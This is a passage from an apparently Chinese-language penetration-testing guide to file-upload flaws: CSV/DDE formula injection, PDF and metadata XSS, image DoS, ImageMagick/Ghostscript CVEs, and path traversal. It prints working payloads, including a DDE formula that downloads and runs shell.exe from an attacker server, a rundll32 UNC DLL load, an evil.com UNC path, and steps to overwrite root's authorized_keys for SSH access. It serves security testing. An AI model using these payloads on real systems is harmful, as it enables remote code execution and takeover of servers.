+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">DDE (&#34;cmd&#34;;&#34;/C calc&#34;;&#34;!A0&#34;)A0
+</span></span><span class="line"><span class="cl">@SUM(1+9)*cmd|&#39; /C calc&#39;!A0
+</span></span><span class="line"><span class="cl">=10+20+cmd|&#39; /C calc&#39;!A0
+</span></span><span class="line"><span class="cl">=cmd|&#39; /C notepad&#39;!&#39;A1&#39;
+</span></span><span class="line"><span class="cl">=cmd|&#39;/C powershell IEX(wget attacker_server/shell.exe)&#39;!A0
+</span></span><span class="line"><span class="cl">=cmd|&#39;/c rundll32.exe \\10.0.0.1\3\2\1.dll,0&#39;!_xlbgnm.A1</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>检查思路：</strong></p>
+<ol>
+<li>上传恶意的CSV文件</li>
+<li>下载恶意的CSV文件</li>
+<li>观察下载后的CSV文件是否对<code>等号=</code>等特殊符号做了处理，payloads会否会成功执行，如果能则说明存在问题</li>
+</ol>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/1748961"target="_blank" rel="external nofollow noopener noreferrer">CSV Injection at xxxxx</a></li>
+<li><a href="https://hackerone.com/reports/403083"target="_blank" rel="external nofollow noopener noreferrer">Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce</a></li>
+</ul>
+<h2 id="17-允许上传pdf" class="heading-element"><span>1.7. 允许上传PDF</span>
+  <a href="#17-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0pdf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>可能存在PDF XSS和任意URL跳转。</p>
+<p>可以直接使用工具生成：https://github.com/harunoz/js_pdf_xss.git</p>
+<p>也可以按照网上的操作，用迅捷PDF编辑器去操作，效果都一样</p>
+<p>pdfjs 漏洞： CVE-2024-4367 获取Cookie、账户接管等。https://github.com/LOURC0D3/CVE-2024-4367-PoC</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/881557"target="_blank" rel="external nofollow noopener noreferrer">Stored XSS through PDF viewer</a></li>
+<li><a href="https://hackerone.com/reports/819863"target="_blank" rel="external nofollow noopener noreferrer">XSS in PDF Viewer</a></li>
+</ul>
+<h2 id="18-允许上传音视频文件" class="heading-element"><span>1.8. 允许上传音视频文件</span>
+  <a href="#18-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0%e9%9f%b3%e8%a7%86%e9%a2%91%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>上传Audio/Video的利用点</p>
+<p>Text Metadata 元数据：XSS, SQLi, 命令注入</p>
+<p>ffmpeg：</p>
+<ul>
+<li>SSRF/File Read in HLS playlists (m3u8)：https://github.com/ffmpeg-test/ffmpeg-test</li>
+<li>SSRF/File Read in HLS inside AVI：https://github.com/neex/ffmpeg-avi-m3u-xbin</li>
+</ul>
+<p>Images in mp3 metadata</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/1062888"target="_blank" rel="external nofollow noopener noreferrer">External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing</a></li>
+<li><a href="https://hackerone.com/reports/115857"target="_blank" rel="external nofollow noopener noreferrer">SSRF and local file read in video to gif converter</a></li>
+</ul>
+<h2 id="19-允许上传图片" class="heading-element"><span>1.9. 允许上传图片</span>
+  <a href="#19-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0%e5%9b%be%e7%89%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><a href="https://github.com/barrracud4/image-upload-exploits"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/barrracud4/image-upload-exploits</a></p>
+<h3 id="大文件dos" class="heading-element"><span>大文件DOS</span>
+  <a href="#%e5%a4%a7%e6%96%87%e4%bb%b6dos" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>文件上传的时候，服务端通常会对上传的文件进行大小限制，范围一般为5MB-200 MB，甚至更小/更大，具体取决于应用程序逻辑。但是如果未限制文件大小或不存在相关的验证检查，那么攻击者可能会上传相对较大的文件，造成大量资源消耗，从而可能导致拒绝服务。</p>
+<p><strong>检查思路：</strong></p>
+<ol>
+<li>创建一个超大的图片文件，如500M的png，并上传图片</li>
+<li>新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况</li>
+</ol>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/454"target="_blank" rel="external nofollow noopener noreferrer">PNG compression DoS</a></li>
+</ul>
+<h3 id="像素洪水攻击" class="heading-element"><span>像素洪水攻击</span>
+  <a href="#%e5%83%8f%e7%b4%a0%e6%b4%aa%e6%b0%b4%e6%94%bb%e5%87%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>任意可以上传图片的地方都可以进行测试；在<code>Pixel Flood Attack</code>中，攻击者尝试上传具有大像素的文件（64250x64250像素），一些应用会使用第三方组件/库对图像进行缩小处理，以节省存储空间和处理能力，但是这些第三方库在处理的时候，会将“整个图像”加载到内存中，它会尝试将4128062500像素分配到内存中，从而消耗服务器资源，导致应用最终崩溃宕机。</p>
+<p><strong>检查思路：</strong></p>
+<ol>
+<li>在https://www.resizepixel.com/中调整图片大小为 64250x64250，上传图片（现在好像不行了）</li>
+<li>新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况</li>
+</ol>
+<p>参考</p>
+<ul>
+<li><a href="https://hackerone.com/reports/390"target="_blank" rel="external nofollow noopener noreferrer">Pixel flood attack</a></li>
+<li><a href="https://hackerone.com/reports/970760"target="_blank" rel="external nofollow noopener noreferrer">Pixel Flood Attack leads to Application level DoS</a></li>
+</ul>
+<h3 id="元数据攻击" class="heading-element"><span>元数据攻击</span>
+  <a href="#%e5%85%83%e6%95%b0%e6%8d%ae%e6%94%bb%e5%87%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>使用 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/"target="_blank" rel="external nofollow noopener noreferrer">exiftool</a>这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>$ exiftool -field <span class="o">=</span> XSS FILE</span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>$ exiftool -Artist<span class="o">=</span>’ “&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="m">1</span> <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span>document.domain<span class="o">)</span>&gt;’ brute.jpeg</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/1154542"target="_blank" rel="external nofollow noopener noreferrer">RCE when removing metadata with ExifTool</a></li>
+<li><a href="https://hackerone.com/reports/836877"target="_blank" rel="external nofollow noopener noreferrer">XXE through injection of a payload in the XMP metadata of a JPEG file</a></li>
+<li><a href="https://hackerone.com/reports/896511"target="_blank" rel="external nofollow noopener noreferrer">XSS in image metadata field</a></li>
+</ul>
+<h3 id="图片二次渲染" class="heading-element"><span>图片二次渲染</span>
+  <a href="#%e5%9b%be%e7%89%87%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>若服务端使用存在漏洞的组件对上传图片进行二次渲染等操作，那么也可以尝试RCE，如<a href="https://www.acunetix.com/vulnerabilities/web/imagemagick-remote-code-execution/"target="_blank" rel="external nofollow noopener noreferrer"><code>ImageMagick</code></a></p>
+<p>一些ImageMagick相关的CVE：</p>
+<ul>
+<li>CVE-2016–3714 — 字符过滤不足导致潜在RCE</li>
+<li>CVE-2016–3715 — File deletion</li>
+<li>CVE-2016–3716 — File moving</li>
+<li>CVE-2016–3717 — Local file read</li>
+<li>CVE-2016–3718 — SSRF</li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/1261413"target="_blank" rel="external nofollow noopener noreferrer">HEIC image preview can be used to invoke Imagick</a></li>
+</ul>
+<h3 id="内存泄露" class="heading-element"><span>内存泄露</span>
+  <a href="#%e5%86%85%e5%ad%98%e6%b3%84%e9%9c%b2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>ImageMagick相关的CVE</p>
+<ul>
+<li>XBM：CVE-2018-16323</li>
+<li>GIF：CVE-2017-15277</li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/19532"target="_blank" rel="external nofollow noopener noreferrer">Missing &ldquo;size check&rdquo; on files to upload could make memory leaks.</a></li>
+<li><a href="https://hackerone.com/reports/2107680"target="_blank" rel="external nofollow noopener noreferrer">AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp</a></li>
+</ul>
+<h3 id="ghostscript-pspdf" class="heading-element"><span>GhostScript PS/PDF</span>
+  <a href="#ghostscript-pspdf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
+<li>CVE-2019-1481X</li>
+<li>CVE-2019-10216</li>
+<li>CVE-2019-6116</li>
+<li>CVE-2018-16509</li>
+<li>CVE-2017-8291</li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/403417"target="_blank" rel="external nofollow noopener noreferrer">Remote Code Execution on xxxx/my_reports on Logo upload</a></li>
+</ul>
+<h3 id="合法文件隐藏载荷" class="heading-element"><span>合法文件隐藏载荷</span>
+  <a href="#%e5%90%88%e6%b3%95%e6%96%87%e4%bb%b6%e9%9a%90%e8%97%8f%e8%bd%bd%e8%8d%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在图片元数据中隐藏 Shell/XSS 载荷</p>
+<p>在图片二进制数据中隐藏 Shell/XSS 载荷</p>
+<p>这个比较简单，和上面内容有重复，就不说了。</p>
+<h2 id="110-允许上传文件预览" class="heading-element"><span>1.10 允许上传文件预览</span>
+  <a href="#110-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e9%a2%84%e8%a7%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>常见的文件预览包括：PDF、图片、HTML等文件。</p>
+<p>如果应用程序调整图片大小或处理媒体，请检查图像漏洞 (+favicon.ico)</p>
+<p>这个比较简单，和上面内容有重复，就不说了。</p>
+<h2 id="111-允许上传配置文件" class="heading-element"><span>1.11 允许上传配置文件</span>
+  <a href="#111-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># Apache httpd/ Tomcat</span>
+</span></span><span class="line"><span class="cl">.htaccess
+</span></span><span class="line"><span class="cl"><span class="c1"># ASP.NET / IIS</span>
+</span></span><span class="line"><span class="cl">web.config
+</span></span><span class="line"><span class="cl"><span class="c1"># 其他访问/框架</span>
+</span></span><span class="line"><span class="cl">……</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="112-文件名攻击" class="heading-element"><span>1.12. 文件名攻击</span>
+  <a href="#112-%e6%96%87%e4%bb%b6%e5%90%8d%e6%94%bb%e5%87%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>不会对上传文件重命名或对文件操作过程中可能性的问题。</p>
+<h3 id="路径遍历unc" class="heading-element"><span>路径遍历/UNC</span>
+  <a href="#%e8%b7%af%e5%be%84%e9%81%8d%e5%8e%86unc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
+<li>相对路径： <code>../../../../tmp/upload.txt</code></li>
+<li>绝对路径：<code>/tmp/upload.txt</code></li>
+<li>UNC路径：<code>\\evil.com\share\test.png</code></li>
+</ul>
+<p>一些网站配置不当，或者开发安全意识不严谨，将用户上传的文件直接按原名存储到服务器中，那么我们就可以尝试将文件名添加回溯符<code>../</code>，以上传文件到任意目录，甚至覆盖文件，达到getshell或者破坏系统的目的。</p>
+<blockquote>
+<p>&#x1f514; Tip</p>
+<p>在windows中由于部分符号不能作为文件名，如果我们将文件名设置为带有这些特殊符号的内容，那么可能让服务器抛出异常</p>
+</blockquote>
+<p>较少的情况下，可以控制上传的目录名，也可以通过路径遍历的方法上传到任意目录中。</p>
+<p>如将文件名设置为<code>../../../../etc/passwd</code>，然后上传对应的内容，那么则有可能直接覆盖掉<code>/etc/passwd</code></p>
+<p>一般情况下尽量去覆盖不会对系统产生影响且我们可以直接观察到的文件，如<code>robots.txt</code>等</p>
+<p><strong>上传覆盖文件</strong></p>
+<p>有点类似Redis写ssh</p>
+<p><strong>写SSH公钥</strong></p>
+<p>覆盖 <strong><code>/root/.ssh/authorized_keys</code></strong> 文件。如果这个文件包含我们控制的私钥的公钥，我们就可以以root 用户通过SSH访问系统。</p>
+<p>使用 <strong>ssh-keygen</strong> 创建一个 SSH 密钥对，以及一个名为 <strong>authorized_keys</strong>的文件，其中包含之前创建的公钥。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kali@kali:~$ ssh-keygen  
+</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.  
+</span></span><span class="line"><span class="cl">Enter file in which to save the key <span class="o">(</span>/home/kali/.ssh/id_rsa<span class="o">)</span>: fileup  
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:   
+</span></span><span class="line"><span class="cl">Enter same passphrase again:   
+</span></span><span class="line"><span class="cl">Your identification has been saved in fileup  
+</span></span><span class="line"><span class="cl">Your public key has been saved in fileup.pub  
+</span></span><span class="line"><span class="cl">...  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kali@kali:~$ cat fileup.pub &gt; authorized_keys</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>为文件上传准备authorized_keys 文件</p>
+</blockquote>
+<p>使用相对路径 <code>../../../../../../../root/.ssh/authorized_keys</code> 上传它进行覆盖。</p>
+<h3 id="ssrf-1" class="heading-element"><span>SSRF</span>
+  <a href="#ssrf-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
